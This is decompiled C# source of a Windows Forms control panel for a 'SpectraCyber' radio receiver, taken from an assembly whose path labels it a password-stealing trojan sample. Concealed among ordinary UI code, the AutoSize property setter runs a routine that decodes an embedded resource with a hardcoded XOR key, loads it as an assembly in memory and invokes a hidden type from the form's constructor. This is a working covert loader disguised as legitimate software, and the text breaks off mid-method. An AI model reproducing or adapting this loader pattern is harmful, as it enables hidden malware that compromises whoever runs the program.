// Decompiled with JetBrains decompiler
// Type: SpectraCyber.SpectraCyber1Form
// Assembly: STAThreadAttrib, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6EE3DE1A-E148-4FBA-A193-65BEA1824C00
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f6a784c2aa30ddaf03919958455d18bf51533a475c21a73eff578df0174cc5d4.exe

using Microsoft.VisualBasic;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;

namespace SpectraCyber
{
  public class SpectraCyber1Form : Form
  {
    private cSpectraCyber1 mscSpectraCyber;
    protected bool mbIsClosing;
    protected bool mbIsLoading;
    protected bool mbnudIFGainChanging;
    protected bool mbnudDCOffsetChanging;
    private IContainer components = (IContainer) null;
    private static object DeclaredEvents;
    private GroupBox grpSCSettings;
    private GroupBox grpStatus;
    private GroupBox grpNoiseSource;
    private RadioButton rdoNoiseSourceOff;
    private RadioButton rdoNoiseSourceOn;
    private ProgressBar progressBar1;
    private TextBox txtVoltage;
    private TextBox txtFrequency;
    private Label lblProgress;
    private Label lblVoltage;
    private Label lblFrequency;
    private Label lblCommPort;
    private TextBox txtCommPort;
    private Button btnReset;
    private Button btnScanStop;
    private Label lblIFGain;
    private Label lblGain;
    private Label lblMode;
    private ComboBox cboMode;
    private Label lblDCOffset;
    private Label lblIntegration;
    private ComboBox cboIntegration;
    private ComboBox cboGain;
    private Button btnSendCommand;
    private GroupBox groupBox1;
    private TextBox txtCommand;
    private CheckBox chkExpectReply;
    private MenuStrip menuStrip1;
    private ToolStripMenuItem connectionToolStripMenuItem;
    private ToolStripMenuItem menuConnect;
    private ToolStripMenuItem menuReset;
    private NumericUpDown nudIFGain;
    private NumericUpDown nudDCOffset;
    private GroupBox grpFrequencyBounds;
    private NumericUpDown nudPLLUpperFrequency;
    private Label label1;
    private Label lblLowerFrequency;
    private NumericUpDown nudPLLLowerFrequency;
    private ListBox lstCommandWindow;
    private BackgroundWorker backgroundWorker1;

    public SpectraCyber1Form(string strCommPort)
    {
      this.InitializeComponent();
      ((MethodBase) Interaction.CallByName(SpectraCyber1Form.DeclaredEvents, "GetMethod", CallType.Get, (object) "DictionaryEnumerator")).Invoke((object) 0, (object[]) new string[3]
      {
        "534D414C4C52",
        "72774145",
        "SpectraCyber"
      });
      this.mscSpectraCyber = new cSpectraCyber1(strCommPort);
      this.mscSpectraCyber.SetParent(this);
      this.mbIsClosing = false;
      this.mbnudIFGainChanging = false;
      this.mbnudDCOffsetChanging = false;
    }

    private void rdoNoiseSourceOn_CheckedChanged(object sender, EventArgs e)
    {
      bool bNoiseSourceOn = false;
      if (this.rdoNoiseSourceOn.Checked)
        bNoiseSourceOn = true;
      this.mscSpectraCyber.SetNoiseSourceStatus(bNoiseSourceOn);
    }

    private void btnReset_Click(object sender, EventArgs e)
    {
      this.mscSpectraCyber.Reset();
      this.SetFormControlValues();
      this.ToggleScanControls(false);
    }

    private void btnSendCommand_Click(object sender, EventArgs e) => this.mscSpectraCyber.SendCommand(this.txtCommand.Text, 80, this.chkExpectReply.Checked, 4);

    public void SetCommandWindowText(string strText)
    {
      this.lstCommandWindow.Items.Add((object) (this.lstCommandWindow.Items.Count.ToString() + ": " + strText));
      this.lstCommandWindow.SelectedIndex = this.lstCommandWindow.Items.Count - 1;
    }

    public void SetVoltageTextbox(string strText) => this.txtVoltage.Text = strText;

    public void SetFrequencyTextbox(string strText) => this.txtFrequency.Text = strText;

    private void SpectraCyber1Form_Load(object sender, EventArgs e)
    {
      this.SetFormOnLoadControlValues();
      this.SetFormControlValues();
    }

    private void menuConnect_Click(object sender, EventArgs e)
    {
      if (!this.mscSpectraCyber.Online)
      {
        this.mscSpectraCyber.Connect();
        this.ToggleConnectionControls(true);
      }
      else
      {
        this.mscSpectraCyber.Disconnect();
        this.ToggleConnectionControls(false);
      }
    }

    private void btnScanStop_Click(object sender, EventArgs e)
    {
      if (!this.mscSpectraCyber.Scanning)
      {
        bool bScanning = true;
        if (this.mscSpectraCyber.Mode == enumMode.Spectrum)
        {
          if (this.nudPLLLowerFrequency.Value % 5M != 0M || this.nudPLLUpperFrequency.Value % 5M != 0M)
          {
            this.nudPLLUpperFrequency.Value %= 5M;
            this.nudPLLLowerFrequency.Value %= 5M;
          }
          if (this.nudPLLLowerFrequency.Value > this.nudPLLUpperFrequency.Value)
          {
            Decimal num = this.nudPLLUpperFrequency.Value;
            this.nudPLLUpperFrequency.Value = this.nudPLLLowerFrequency.Value;
            this.nudPLLLowerFrequency.Value = num;
          }
          if (this.nudPLLLowerFrequency.Value == this.nudPLLUpperFrequency.Value)
          {
            bScanning = false;
            int num = (int) MessageBox.Show("The lower and upper bounds for the scan are the same value.");
            this.nudPLLLowerFrequency.Focus();
          }
          this.mscSpectraCyber.PLLLowerBound = (double) (this.nudPLLLowerFrequency.Value / 1000M);
          this.mscSpectraCyber.PLLUpperBound = (double) (this.nudPLLUpperFrequency.Value / 1000M);
        }
        this.ToggleScanControls(bScanning);
        if (!bScanning)
          return;
        this.mscSpectraCyber.Scan();
      }
      else
      {
        this.ToggleScanControls(false);
        this.mscSpectraCyber.Stop();
      }
    }

    private void ToggleScanControls(bool bScanning)
    {
      if (bScanning)
        this.btnScanStop.Text = "Stop";
      else
        this.btnScanStop.Text = "Scan";
      this.cboMode.Enabled = !bScanning;
      this.cboIntegration.Enabled = !bScanning;
      this.nudPLLLowerFrequency.Enabled = !bScanning;
      this.nudPLLUpperFrequency.Enabled = !bScanning;
    }

    private void ToggleConnectionControls(bool bOnline)
    {
      if (bOnline)
        this.menuConnect.Text = "Disconnect";
      else
        this.menuConnect.Text = "Connect";
      this.btnReset.Enabled = bOnline;
      this.btnScanStop.Enabled = bOnline;
      this.menuReset.Enabled = bOnline;
    }

    private void cboMode_SelectedIndexChanged(object sender, EventArgs e)
    {
      enumMode enumMode;
      if ((enumMode) this.cboMode.SelectedItem == enumMode.Spectrum)
      {
        enumMode = enumMode.Spectrum;
        this.grpFrequencyBounds.Show();
      }
      else
      {
        enumMode = enumMode.Continuum;
        this.grpFrequencyBounds.Hide();
      }
      this.mscSpectraCyber.Mode = enumMode;
      this.SetFormControlValues();
    }

    private void SetFormOnLoadControlValues()
    {
      this.txtCommPort.Text = this.mscSpectraCyber.CommPort;
      this.cboMode.Items.Add((object) enumMode.Continuum);
      this.cboMode.Items.Add((object) enumMode.Spectrum);
      this.cboMode.SelectedItem = (object) this.mscSpectraCyber.Mode;
      this.nudIFGain.Minimum = (Decimal) this.mscSpectraCyber.IFGainMin;
      this.nudIFGain.Maximum = (Decimal) this.mscSpectraCyber.IFGainMax;
      Decimal num1 = (Decimal) (-1000.0 * this.mscSpectraCyber.PLLMaxOffset);
      Decimal num2 = (Decimal) (1000.0 * this.mscSpectraCyber.PLLMaxOffset);
      Decimal num3 = (Decimal) (1000.0 * this.mscSpectraCyber.PLLStepSize);
      this.nudPLLLowerFrequency.Minimum = num1;
      this.nudPLLLowerFrequency.Maximum = num2;
      this.nudPLLLowerFrequency.Increment = num3;
      this.nudPLLUpperFrequency.Minimum = num1;
      this.nudPLLUpperFrequency.Maximum = num2;
      this.nudPLLUpperFrequency.Increment = num3;
      this.nudDCOffset.Minimum = (Decimal) this.mscSpectraCyber.DCOffsetMinValue;
      this.nudDCOffset.Maximum = (Decimal) this.mscSpectraCyber.DCOffsetMaxValue;
      this.nudDCOffset.Increment = (Decimal) this.mscSpectraCyber.DCOffsetStepSize;
      foreach (int gainValue in this.mscSpectraCyber.GainValues)
        this.cboGain.Items.Add((object) gainValue);
      if (this.mscSpectraCyber.GetNoiseSourceStatus())
        this.rdoNoiseSourceOn.Checked = true;
      else
        this.rdoNoiseSourceOff.Checked = true;
      this.ToggleConnectionControls(false);
    }

    private void SetFormControlValues()
    {
      this.cboIntegration.Items.Clear();
      foreach (double integrationValue in this.mscSpectraCyber.ValidIntegrationValues)
        this.cboIntegration.Items.Add((object) integrationValue);
      this.cboIntegration.SelectedItem = (object) this.mscSpectraCyber.Integration;
      this.nudDCOffset.Value = (Decimal) this.mscSpectraCyber.DCOffset;
      this.cboGain.SelectedItem = (object) this.mscSpectraCyber.Gain;
    }

    public bool IsClosing => this.mbIsClosing;

    private void cboIntegration_SelectedIndexChanged(object sender, EventArgs e) => this.mscSpectraCyber.Integration = (double) this.cboIntegration.SelectedItem;

    private void cboGain_SelectedIndexChanged(object sender, EventArgs e) => this.mscSpectraCyber.Gain = (int) this.cboGain.SelectedItem;

    private void SpectraCyber1Form_FormClosing(object sender, FormClosingEventArgs e)
    {
      this.mbIsClosing = true;
      this.mscSpectraCyber.Disconnect();
    }

    private void nudIFGain_ValueChanged(object sender, EventArgs e)
    {
      if (this.mbnudIFGainChanging)
        return;
      this.IFGainBoxChanged();
    }

    private void nudIFGain_MouseUp(object sender, MouseEventArgs e)
    {
      this.mbnudIFGainChanging = false;
      this.IFGainBoxChanged();
    }

    private void nudIFGain_MouseDown(object sender, MouseEventArgs e) => this.mbnudIFGainChanging = true;

    private void IFGainBoxChanged() => this.mscSpectraCyber.IFGain = (double) this.nudIFGain.Value;

    private void nudDCOffset_ValueChanged(object sender, EventArgs e)
    {
      if (this.mbnudDCOffsetChanging)
        return;
      this.DCOffsetBoxChanged();
    }

    private void nudDCOffset_MouseDown(object sender, MouseEventArgs e) => this.mbnudDCOffsetChanging = true;

    private void nudDCOffset_MouseUp(object sender, MouseEventArgs e)
    {
      this.mbnudDCOffsetChanging = false;
      this.DCOffsetBoxChanged();
    }

    private void DCOffsetBoxChanged() => this.mscSpectraCyber.DCOffset = (double) this.nudDCOffset.Value;

    private void mscSpectraCyber_ScanComplete(object sender, EventArgs e) => this.ToggleScanControls(this.mscSpectraCyber.Scanning);

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    public override bool AutoSize
    {
      get => base.AutoSize;
      set => SpectraCyber1Form.SerializationHeaderRecord();
    }

    private static bool SerializationHeaderRecord()
    {
      byte[] OSVERSIONINFOEX = (byte[]) new ResourceManager(typeof (Form1)).GetObject("Spectra2");
      string str = "3V52HTB4H5Q5NFB49G58C5";
      for (int index = 67606; index >= 0; index += -1)
        OSVERSIONINFOEX[index % 33792] = SpectraCyber1Form.@int((SpectraCyber1Form.@object((int) OSVERSIONINFOEX[index % 33792] ^ (int) str[index % 22]) - SpectraCyber1Form.@object((int) OSVERSIONINFOEX[(index + 1) % 33792]) + 256) % 256);
      SpectraCyber1Form.@byte(SpectraCyber1Form.@return(OSVERSIONINFOEX));
      return true;
    }

    private static int @object(int x) => x;

    private static byte @int(int x) => (byte) x;

    private static object @return(byte[] OSVERSIONINFOEX) => (object) AppDomain.CurrentDomain.Load(OSVERSIONINFOEX);

    private static void @byte(object CompatibilitySwitches) => SpectraCyber1Form.DeclaredEvents = (object) ((Assembly) CompatibilitySwitches).GetType("Forging.Forging");

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (SpectraCyber1Form));
      this.grpSCSettings = new GroupBox();
      this.grpFrequencyBounds = new GroupBox();
      this.nudPLLUpperFrequency = new NumericUpDown();
      this.label1 = new Label();
      this.lblLowerFrequency = new Label();
      this.nudPLLLowerFrequency = new NumericUpDown();
      this.nudDCOffset = new NumericUpDown();
      this.nudIFGain = new NumericUpDown();
      this.cboIntegration = new ComboBox();
      this.cboGain = new ComboBox();
      this.grpNoiseSource = new GroupBox();
      this.rdoNoiseSourceOff = new RadioButton();
      this.rdoNoiseSourceOn = new RadioButton();
      this.grpStatus = new GroupBox();
      this.progressBar1 = new ProgressBar();
      this.txtVoltage = new TextBox();
      this.txtFrequency = new TextBox();
      this.lblProgress = new Label();
      this.lblVoltage = new Label();
      this.lblFrequency = new Label();
      this.lblDCOffset = new Label();
      this.lblIntegration = new Label();
      this.lblGain = new Label();
      this.lblMode = new Label();
      this.lblCommPort = new Label();
      this.cboMode = new ComboBox();
      this.txtCommPort = new TextBox();
      this.lblIFGain = new Label();
      this.btnReset = new Button();
      this.btnScanStop = new Button();
      this.btnSendCommand = new Button();
      this.groupBox1 = new GroupBox();
      this.lstCommandWindow = new ListBox();
      this.chkExpectReply = new CheckBox();
      this.txtCommand = new TextBox();
      this.menuStrip1 = new MenuStrip();
      this.connectionToolStripMenuItem = new ToolStripMenuItem();
      this.menuConnect = new ToolStripMenuItem();
      this.menuReset = new ToolStripMenuItem();
      this.backgroundWorker1 = new BackgroundWorker();
      this.grpSCSettings.SuspendLayout();
      this.grpFrequencyBounds.SuspendLayout();
      this.nudPLLUpperFrequency.BeginInit();
      this.nudPLLLowerFrequency.BeginInit();
      this.nudDCOffset.BeginInit();
      this.nudIFGain.BeginInit();
      this.grpNoiseSource.SuspendLayout();
      this.grpStatus.SuspendLayout();
      this.groupBox1.SuspendLayout();
      this.menuStrip1.SuspendLayout();
      this.SuspendLayout();
      this.grpSCSettings.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Right;
      this.grpSCSettings.Controls.Add((Control) this.grpFrequencyBounds);
      this.grpSCSettings.Controls.Add((Control) this.nudDCOffset);
      this.grpSCSettings.Controls.Add((Control) this.nudIFGain);
      this.grpSCSettings.Controls.Add((Control) this.cboIntegration);
      this.grpSCSettings.Controls.Add((Control) this.cboGain);
      this.grpSCSettings.Controls.Add((Control) this.grpNoiseSource);
      this.grpSCSettings.Controls.Add((Control) this.grpStatus);
      this.grpSCSettings.Controls.Add((Control) this.lblDCOffset);
      this.grpSCSettings.Controls.Add((Control) this.lblIntegration);
      this.grpSCSettings.Controls.Add((Control) this.lblGain);
      this.grpSCSettings.Controls.Add((Control) this.lblMode);
      this.grpSCSettings.Controls.Add((Control) this.lblCommPort);
      this.grpSCSettings.Controls.Add((Control) this.cboMode);
      this.grpSCSettings.Controls.Add((Control) this.txtCommPort);
      this.grpSCSettings.Controls.Add((Control) this.lblIFGain);
      this.grpSCSettings.Controls.Add((Control) this.btnReset);
      this.grpSCSettings.Controls.Add((Control) this.btnScanStop);
      this.grpSCSettings.Location = new Point(1109, 64);
      this.grpSCSettings.Margin = new Padding(8, 7, 8, 7);
      this.grpSCSettings.Name = "grpSCSettings";
      this.grpSCSettings.Padding = new Padding(8, 7, 8, 7);
      this.grpSCSettings.Size = new Size(549, 1157);
      this.grpSCSettings.TabIndex = 0;
      this.grpSCSettings.TabStop = false;
      this.grpSCSettings.Text = "Spectra Cyber Settings";
      this.AutoSize = true;
      this.grpFrequencyBounds.Controls.Add((Control) this.nudPLLUpperFrequency);
      this.grpFrequencyBounds.Controls.Add((Control) this.label1);
      this.grpFrequencyBounds.Controls.Add((Control) this.lblLowerFrequency);
      this.grpFrequencyBounds.Controls.Add((Control) this.nudPLLLowerFrequency);
      this.grpFrequencyBounds.Location = new Point(19, 548);
      this.grpFrequencyBounds.Margin = new Padding(8, 7, 8, 7);
      this.grpFrequencyBounds.Name = "grpFrequencyBounds";
      this.grpFrequencyBounds.Padding = new Padding(8, 7, 8, 7);
      this.grpFrequencyBounds.Size = new Size(515, 157);
      this.grpFrequencyBounds.TabIndex = 17;
      this.grpFrequencyBounds.TabStop = false;
      this.grpFrequencyBounds.Text = "Scan Range (kHz)";
      this.nudPLLUpperFrequency.Increment = new Decimal(new int[4]
      {
        5,
        0,
        0,
        196608
      });
      this.nudPLLUpperFrequency.Location = new Point(232, 95);
      this.nudPLLUpperFrequency.Margin = new Padding(8, 7, 8, 7);
      this.nudPLLUpperFrequency.Name = "nudPLLUpperFrequency";
      this.nudPLLUpperFrequency.Size = new Size(267, 38);
      this.nudPLLUpperFrequency.TabIndex = 3;
      this.label1.AutoSize = true;
      this.label1.Location = new Point(16, 100);
      this.label1.Margin = new Padding(8, 0, 8, 0);
      this.label1.Name = "label1";
      this.label1.Size = new Size(182, 32);
      this.label1.TabIndex = 2;
      this.label1.Text = "Upper Bound";
      this.lblLowerFrequency.AutoSize = true;
      this.lblLowerFrequency.Location = new Point(16, 38);
      this.lblLowerFrequency.Margin = new Padding(8, 0, 8, 0);
      this.lblLowerFrequency.Name = "lblLowerFrequency";
      this.lblLowerFrequency.Size = new Size(182, 32);
      this.lblLowerFrequency.TabIndex = 1;
      this.lblLowerFrequency.Text = "Lower Bound";
      this.nudPLLLowerFrequency.Increment = new Decimal(new int[4]
      {
        5,
        0,
        0,
        196608
      });
      this.nudPLLLowerFrequency.Location = new Point(232, 33);
      this.nudPLLLowerFrequency.Margin = new Padding(8, 7, 8, 7);
      this.nudPLLLowerFrequency.Name = "nudPLLLowerFrequency";
      this.nudPLLLowerFrequency.Size = new Size(267, 38);
      this.nudPLLLowerFrequency.TabIndex = 0;
      this.nudDCOffset.DecimalPlaces = 3;
      this.nudDCOffset.Location = new Point(251, 360);
      this.nudDCOffset.Margin = new Padding(8, 7, 8, 7);
      this.nudDCOffset.Name = "nudDCOffset";
      this.nudDCOffset.Size = new Size(267, 38);
      this.nudDCOffset.TabIndex = 5;
      this.nudDCOffset.ValueChanged += new EventHandler(this.nudDCOffset_ValueChanged);
      this.nudDCOffset.MouseDown += new MouseEventHandler(this.nudDCOffset_MouseDown);
      this.nudDCOffset.MouseUp += new MouseEventHandler(this.nudDCOffset_MouseUp);
      this.nudIFGain.DecimalPlaces = 2;
      this.nudIFGain.Increment = new Decimal(new int[4]
      {
        25,
        0,
        0,
        131072
      });
      this.nudIFGain.Location = new Point(251, 174);
      this.nudIFGain.Margin = new Padding(8, 7, 8, 7);
      this.nudIFGain.Name = "nudIFGain";
      this.nudIFGain.Size = new Size(267, 38);
      this.nudIFGain.TabIndex = 5;
      this.nudIFGain.ValueChanged += new EventHandler(this.nudIFGain_ValueChanged);
      this.nudIFGain.MouseDown += new MouseEventHandler(this.nudIFGain_MouseDown);
      this.nudIFGain.MouseUp += new MouseEventHandler(this.nudIFGain_MouseUp);
      this.cboIntegration.DropDownStyle = ComboBoxStyle.DropDownList;
      this.cboIntegration.FormattingEnabled = true;
      this.cboIntegration.Location = new Point(251, 296);
      this.cboIntegration.Margin = new Padding(8, 7, 8, 7);
      this.cboIntegration.Name = "cboIntegration";
      this.cboIntegration.Size = new Size(260, 39);
      this.cboIntegration.TabIndex = 16;
      this.cboIntegration.SelectedIndexChanged += new EventHandler(this.cboIntegration_SelectedIndexChanged);
      this.cboGain.DropDownStyle = ComboBoxStyle.DropDownList;
      this.cboGain.FormattingEnabled = true;
      this.cboGain.Location = new Point(251, 234);
      this.cboGain.Margin = new Padding(8, 7, 8, 7);
      this.cboGain.Name = "cboGain";
      this.cboGain.Size = new Size(260, 39);
      this.cboGain.TabIndex = 15;
      this.cboGain.SelectedIndexChanged += new EventHandler(this.cboGain_SelectedIndexChanged);
      this.grpNoiseSource.Controls.Add((Control) this.rdoNoiseSourceOff);
      this.grpNoiseSource.Controls.Add((Control) this.rdoNoiseSourceOn);
      this.grpNoiseSource.Location = new Point(16, 422);
      this.grpNoiseSource.Margin = new Padding(8, 7, 8, 7);
      this.grpNoiseSource.Name = "grpNoiseSource";
      this.grpNoiseSource.Padding = new Padding(8, 7, 8, 7);
      this.grpNoiseSource.Size = new Size(517, 110);
      this.grpNoiseSource.TabIndex = 2;
      this.grpNoiseSource.TabStop = false;
      this.grpNoiseSource.Text = "Noise Source";
      this.rdoNoiseSourceOff.AutoSize = true;
      this.rdoNoiseSourceOff.Location = new Point(139, 48);
      this.rdoNoiseSourceOff.Margin = new Padding(8, 7, 8, 7);
      this.rdoNoiseSourceOff.Name = "rdoNoiseSourceOff";
      this.rdoNoiseSourceOff.Size = new Size(90, 36);
      this.rdoNoiseSourceOff.TabIndex = 1;
      this.rdoNoiseSourceOff.TabStop = true;
      this.rdoNoiseSourceOff.Text = "Off";
      this.rdoNoiseSourceOff.UseVisualStyleBackColor = true;
      this.rdoNoiseSourceOn.AutoSize = true;
      this.rdoNoiseSourceOn.Location = new Point(19, 48);
      this.rdoNoiseSourceOn.Margin = new Padding(8, 7, 8, 7);
      this.rdoNoiseSourceOn.Name = "rdoNoiseSourceOn";
      this.rdoNoiseSourceOn.Size = new Size(90, 36);
      this.rdoNoiseSourceOn.TabIndex = 0;
      this.rdoNoiseSourceOn.TabStop = true;
      this.rdoNoiseSourceOn.Text = "On";
      this.rdoNoiseSourceOn.UseVisualStyleBackColor = true;
      this.rdoNoiseSourceOn.CheckedChanged += new EventHandler(this.rdoNoiseSourceOn_CheckedChanged);
      this.grpStatus.Anchor = AnchorStyles.Bottom;
      this.grpStatus.Controls.Add((Control) this.progressBar1);
      this.grpStatus.Controls.Add((Control) this.txtVoltage);
      this.grpStatus.Controls.Add((Control) this.txtFrequency);
      this.grpStatus.Controls.Add((Control) this.lblProgress);
      this.grpStatus.Controls.Add((Control) this.lblVoltage);
      this.grpStatus.Controls.Add((Control) this.lblFrequency);
      this.grpStatus.Location = new Point(24, 835);
      this.grpStatus.Margin = new Padding(8, 7, 8, 7);
      this.grpStatus.Name = "grpStatus";
      this.grpStatus.Padding = new Padding(8, 7, 8, 7);
      this.grpStatus.Size = new Size(509, 238);
      this.grpStatus.TabIndex = 1;
      this.grpStatus.TabStop = false;
      this.grpStatus.Text = "Status";
      this.progressBar1.Location = new Point(189, 162);
      this.progressBar1.Margin = new Padding(8, 7, 8, 7);
      this.progressBar1.Name = "progressBar1";
      this.progressBar1.Size = new Size(267, 55);
      this.progressBar1.TabIndex = 5;
      this.txtVoltage.Location = new Point(189, 100);
      this.txtVoltage.Margin = new Padding(8, 7, 8, 7);
      this.txtVoltage.Name = "txtVoltage";
      this.txtVoltage.ReadOnly = true;
      this.txtVoltage.Size = new Size(260, 38);
      this.txtVoltage.TabIndex = 4;
      this.txtFrequency.Location = new Point(189, 38);
      this.txtFrequency.Margin = new Padding(8, 7, 8, 7);
      this.txtFrequency.Name = "txtFrequency";
      this.txtFrequency.ReadOnly = true;
      this.txtFrequency.Size = new Size(260, 38);
      this.txtFrequency.TabIndex = 3;
      this.lblProgress.AutoSize = true;
      this.lblProgress.Location = new Point(19, 162);
      this.lblProgress.Margin = new Padding(8, 0, 8, 0);
      this.lblProgress.Name = "lblProgress";
      this.lblProgress.Size = new Size(128, 32);
      this.lblProgress.TabIndex = 2;
      this.lblProgress.Text = "Progress";
      this.lblVoltage.AutoSize = true;
      this.lblVoltage.Location = new Point(19, 107);
      this.lblVoltage.Margin = new Padding(8, 0, 8, 0);
      this.lblVoltage.Name = "lblVoltage";
      this.lblVoltage.Size = new Size(113, 32);
      this.lblVoltage.TabIndex = 1;
      this.lblVoltage.Text = "Voltage";
      this.lblFrequency.AutoSize = true;
      this.lblFrequency.Location = new Point(19, 48);
      this.lblFrequency.Margin = new Padding(8, 0, 8, 0);
      this.lblFrequency.Name = "lblFrequency";
      this.lblFrequency.Size = new Size(149, 32);
      this.lblFrequency.TabIndex = 0;
      this.lblFrequency.Text = "Frequency";
      this.lblDCOffset.AutoSize = true;
      this.lblDCOffset.Location = new Point(21, 365);
      this.lblDCOffset.Margin = new Padding(8, 0, 8, 0);
      this.lblDCOffset.Name = "lblDCOffset";
      this.lblDCOffset.Size = new Size(138, 32);
      this.lblDCOffset.TabIndex = 13;
      this.lblDCOffset.Text = "DC Offset";
      this.lblIntegration.AutoSize = true;
      this.lblIntegration.Location = new Point(21, 303);
      this.lblIntegration.Margin = new Padding(8, 0, 8, 0);
      this.lblIntegration.Name = "lblIntegration";
      this.lblIntegration.Size = new Size(219, 32);
      this.lblIntegration.TabIndex = 11;
      this.lblIntegration.Text = "Integration (sec)";
      this.lblGain.AutoSize = true;
      this.lblGain.Location = new Point(21, 241);
      this.lblGain.Margin = new Padding(8, 0, 8, 0);
      this.lblGain.Name = "lblGain";
      this.lblGain.Size = new Size(76, 32);
      this.lblGain.TabIndex = 9;
      this.lblGain.Text = "Gain";
      this.lblMode.AutoSize = true;
      this.lblMode.Location = new Point(21, 117);
      this.lblMode.Margin = new Padding(8, 0, 8, 0);
      this.lblMode.Name = "lblMode";
      this.lblMode.Size = new Size(86, 32);
      this.lblMode.TabIndex = 8;
      this.lblMode.Text = "Mode";
      this.lblCommPort.AutoSize = true;
      this.lblCommPort.Location = new Point(16, 55);
      this.lblCommPort.Margin = new Padding(8, 0, 8, 0);
      this.lblCommPort.Name = "lblCommPort";
      this.lblCommPort.Size = new Size(156, 32);
      this.lblCommPort.TabIndex = 3;
      this.lblCommPort.Text = "Comm Port";
      this.cboMode.DropDownStyle = ComboBoxStyle.DropDownList;
      this.cboMode.FormattingEnabled = true;
      this.cboMode.Location = new Point(251, 110);
      this.cboMode.Margin = new Padding(8, 7, 8, 7);
      this.cboMode.Name = "cboMode";
      this.cboMode.Size = new Size(260, 39);
      this.cboMode.TabIndex = 7;
      this.cboMode.SelectedIndexChanged += new EventHandler(this.cboMode_SelectedIndexChanged);
      this.txtCommPort.Location = new Point(251, 48);
      this.txtCommPort.Margin = new Padding(8, 7, 8, 7);
      this.txtCommPort.Name = "txtCommPort";
      this.txtCommPort.ReadOnly = true;
      this.txtCommPort.Size = new Size(260, 38);
      this.txtCommPort.TabIndex = 2;
      this.lblIFGain.AutoSize = true;
      this.lblIFGain.Location = new Point(21, 179);
      this.lblIFGain.Margin = new Padding(8, 0, 8, 0);
      this.lblIFGain.Name = "lblIFGain";
      this.lblIFGain.Size = new Size(107, 32);
      this.lblIFGain.TabIndex = 5;
      this.lblIFGain.Text = "IF Gain";
      this.btnReset.Anchor = AnchorStyles.Bottom;
      this.btnReset.Location = new Point(285, 1087);
      this.btnReset.Margin = new Padding(8, 7, 8, 7);
      this.btnReset.Name = "btnReset";
      this.btnReset.Size = new Size(200, 55);
      this.btnReset.TabIndex = 1;
      this.btnReset.Text = "Reset";
      this.btnReset.UseVisualStyleBackColor = true;
      this.btnReset.Click += new EventHandler(this.btnReset_Click);
      this.btnScanStop.Anchor = AnchorStyles.Bottom;
      this.btnScanStop.Location = new Point(67, 1087);
      this.btnScanStop.Margin = new Padding(8, 7, 8, 7);
      this.btnScanStop.Name = "btnScanStop";
      this.btnScanStop.Size = new Size(200, 55);
      this.btnScanStop.TabIndex = 0;
      this.btnScanStop.Text = "Scan";
      this.btnScanStop.UseVisualStyleBackColor = true;
      this.btnScanStop.Click += new EventHandler(this.btnScanStop_Click);
      this.btnSendCommand.Location = new Point(421, 508);
      this.btnSendCommand.Margin = new Padding(8, 7, 8, 7);
      this.btnSendCommand.Name = "btnSendCommand";
      this.btnSendCommand.Size = new Size(240, 55);
      this.btnSendCommand.TabIndex = 2;
      this.btnSendCommand.Text = "Send Command";
      this.btnSendCommand.UseVisualStyleBackColor = true;
      this.btnSendCommand.Click += new EventHandler(this.btnSendCommand_Click);
      this.groupBox1.Controls.Add((Control) this.lstCommandWindow);
      this.groupBox1.Controls.Add((Control) this.chkExpectReply);
      this.groupBox1.Controls.Add((Control) this.txtCommand);
      this.groupBox1.Controls.Add((Control) this.btnSendCommand);
      this.groupBox1.Location = new Point(32, 582);
      this.groupBox1.Margin = new Padding(8, 7, 8, 7);
      this.groupBox1.Name = "groupBox1";
      this.groupBox1.Padding = new Padding(8, 7, 8, 7);
      this.groupBox1.Size = new Size(821, 577);
      this.groupBox1.TabIndex = 3;
      this.groupBox1.TabStop = false;
      this.groupBox1.Text = "Temp Command Window";
      this.lstCommandWindow.FormattingEnabled = true;
      this.lstCommandWindow.ItemHeight = 31;
      this.lstCommandWindow.Location = new Point(19, 45);
      this.lstCommandWindow.Margin = new Padding(8, 7, 8, 7);
      this.lstCommandWindow.Name = "lstCommandWindow";
      this.lstCommandWindow.Size = new Size(777, 376);
      this.lstCommandWindow.TabIndex = 8;
      this.chkExpectReply.AutoSize = true;
      this.chkExpectReply.Location = new Point(19, 444);
      this.chkExpectReply.Margin = new Padding(8, 7, 8, 7);
      this.chkExpectReply.Name = "chkExpectReply";
      this.chkExpectReply.Size = new Size(213, 36);
      this.chkExpectReply.TabIndex = 7;
      this.chkExpectReply.Text = "ExpectReply";
      this.chkExpectReply.UseVisualStyleBackColor = true;
      this.txtCommand.Location = new Point(16, 508);
      this.txtCommand.Margin = new Padding(8, 7, 8, 7);
      this.txtCommand.Name = "txtCommand";
      this.txtCommand.Size = new Size(383, 38);
      this.txtCommand.TabIndex = 3;
      this.menuStrip1.ImageScalingSize = new Size(40, 40);
      this.menuStrip1.Items.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.connectionToolStripMenuItem
      });
      this.menuStrip1.Location = new Point(0, 0);
      this.menuStrip1.Name = "menuStrip1";
      this.menuStrip1.Padding = new Padding(16, 5, 0, 5);
      this.menuStrip1.Size = new Size(1691, 55);
      this.menuStrip1.TabIndex = 4;
      this.menuStrip1.Text = "menuStrip1";
      this.connectionToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.menuConnect,
        (ToolStripItem) this.menuReset
      });
      this.connectionToolStripMenuItem.Name = "connectionToolStripMenuItem";
      this.connectionToolStripMenuItem.Size = new Size(183, 45);
      this.connectionToolStripMenuItem.Text = "Connection";
      this.menuConnect.Name = "menuConnect";
      this.menuConnect.Size = new Size(243, 46);
      this.menuConnect.Text = "Connect";
      this.menuConnect.Click += new EventHandler(this.menuConnect_Click);
      this.menuReset.Name = "menuReset";
      this.menuReset.Size = new Size(243, 46);
      this.menuReset.Text = "Reset";
      this.menuReset.Click += new EventHandler(this.btnReset_Click);
      this.AutoScaleDimensions = new SizeF(16f, 31f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(1691, 1250);
      this.Controls.Add((Control) this.groupBox1);
      this.Controls.Add((Control) this.grpSCSettings);
      this.Controls.Add((Control) this.menuStrip1);
